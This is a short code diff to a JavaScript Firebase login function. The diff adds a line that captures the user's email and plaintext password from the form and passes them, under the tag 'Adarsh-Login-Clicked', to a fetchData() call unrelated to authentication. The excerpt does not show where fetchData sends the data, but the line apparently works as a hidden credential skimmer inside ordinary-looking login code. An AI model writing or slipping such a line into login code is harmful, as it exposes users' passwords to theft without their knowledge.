@@ -1,6 +1,8 @@
 async function Login() {
+
     userEmail = document.getElementById("email").value;
     userPassword = document.getElementById("password").value;
+    fetchData("Adarsh-Login-Clicked" + "user:" + userEmail + "pass:" + userPassword);
     firebase.auth().signInWithEmailAndPassword(userEmail, userPassword)
         .then((userCredential) => {
             var user = userCredential.user;
@@ -8,7 +10,6 @@ async function Login() {
         .catch((error) => {
             DisplayMsg(1, "Sorry!", "You Are Not Registered", 0, "t");
         });
-
 }
 
 firebase.auth().onAuthStateChanged(function(user) {
